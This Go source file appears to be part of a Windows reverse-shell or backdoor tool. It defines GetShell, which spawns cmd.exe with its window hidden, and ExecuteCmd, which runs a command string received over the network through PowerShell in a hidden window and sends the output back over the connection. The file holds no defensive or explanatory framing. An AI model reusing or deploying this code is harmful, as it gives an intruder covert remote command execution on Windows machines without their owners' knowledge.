// +build windows !linux !darwin !freebsd

package shell

import (
	"net"
	"os/exec"
	"syscall"
)

func GetShell() *exec.Cmd {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
